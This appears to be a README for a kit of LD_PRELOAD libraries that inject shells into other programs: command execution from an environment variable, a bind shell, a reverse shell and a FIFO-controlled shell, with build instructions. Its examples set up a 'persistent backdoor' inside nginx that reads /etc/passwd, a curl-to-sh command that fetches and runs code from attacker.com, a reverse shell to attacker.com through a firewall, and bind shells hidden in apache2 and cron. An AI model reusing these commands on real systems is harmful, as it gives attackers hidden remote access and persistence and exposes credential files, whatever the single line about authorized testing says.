# Preload Shell Libraries

This directory contains various preload libraries that provide shell access through different methods. These libraries use the `LD_PRELOAD` mechanism to inject functionality into target processes.

## Available Libraries

### shell-env
Executes a command from an environment variable.

**Usage:**
```bash
EXEC_CMD="id" LD_PRELOAD=./shell-env.so <target_program>
EXEC_CMD="uname -a; whoami" LD_PRELOAD=./shell-env.so ls
```

**Features:**
- Reads command from `EXEC_CMD` environment variable
- Changes directory to `/`
- Replaces the process with shell executing the command

### shell-helper
Executes a script from `/dev/shm/helper.sh`.

**Usage:**
```bash
# First create the script
echo '#!/bin/sh' > /dev/shm/helper.sh
echo 'id' >> /dev/shm/helper.sh
chmod +x /dev/shm/helper.sh

# Then run
LD_PRELOAD=./shell-helper.so <target_program>
```

**Features:**
- Executes fixed script at `/dev/shm/helper.sh`
- Useful when environment variables cannot be set

### shell-bind
Opens a bind shell on a specified port.

**Usage:**
```bash
# Default port 4444
LD_PRELOAD=./shell-bind.so <target_program>

# Custom port
BIND_PORT=8080 LD_PRELOAD=./shell-bind.so <target_program>

# Connect from another terminal
nc localhost 4444
```

**Features:**
- Binds to specified port (default: 4444)
- Accepts one connection
- Redirects stdin/stdout/stderr to socket
- Replaces process with `/bin/sh`

### shell-reverse
Connects back to a remote host (reverse shell).

**Usage:**
```bash
# Start listener on remote host
nc -l -p 4444

# Connect back
RHOST=192.168.1.100 LD_PRELOAD=./shell-reverse.so <target_program>
RHOST=192.168.1.100 RPORT=8080 LD_PRELOAD=./shell-reverse.so <target_program>
```

**Features:**
- Connects to `RHOST:RPORT` (default port: 4444)
- Redirects stdin/stdout/stderr to socket
- Requires `RHOST` environment variable

### shell-fifo
Creates a FIFO for command execution.

**Usage:**
```bash
# Terminal 1 - Start the shell
LD_PRELOAD=./shell-fifo.so sleep 3600

# Terminal 2 - Send commands
echo "id" > /tmp/cmd.fifo
echo "uname -a" > /tmp/cmd.fifo
echo "ls -la" > /tmp/cmd.fifo

# Custom FIFO path
FIFO_PATH=/tmp/myfifo LD_PRELOAD=./shell-fifo.so cat
```

**Features:**
- Creates FIFO at specified path (default: `/tmp/cmd.fifo`)
- Shell reads commands from FIFO
- Multiple commands can be sent sequentially
- Output appears in the terminal where the preloaded program runs

## Building

These libraries are built as part of the preload build system:

```bash
# Build all shell libraries for all architectures
./build-preload

# Build specific library
./build-preload shell-env

# Build for specific architecture
./build-preload shell-bind --arch x86_64

# Output location
ls output-preload/glibc/x86_64/
```

## Security Notes

- Environment variables prevent recursive loading
- Libraries operate silently (no error messages in simplified version)
- These are intended for authorized security testing only

## Troubleshooting

**Library loads multiple times:**
- Each library sets an environment variable to prevent recursion
- Check for `SHELL_*_ACTIVE` variables

**No output visible:**
- Output goes to the original process's stdout/stderr
- For shell-fifo, make sure to send commands to the FIFO
- Use programs that don't produce their own output (like `sleep`, `cat`)

**Silent operation:**
- Simplified libraries don't show error messages
- Check return codes or use strace for debugging

## Examples

### Persistent backdoor with shell-fifo
```bash
# Start a long-running process with shell-fifo
LD_PRELOAD=./shell-fifo.so nginx &

# Control it anytime
echo "cat /etc/passwd" > /tmp/cmd.fifo
```

```bash
# Run single command and exit
EXEC_CMD="curl http://attacker.com/data | sh" LD_PRELOAD=./shell-env.so date
```

```bash
# Bind shell for LAN access
BIND_PORT=31337 LD_PRELOAD=./shell-bind.so apache2

# Reverse shell through firewall
RHOST=attacker.com RPORT=443 LD_PRELOAD=./shell-reverse.so cron
```
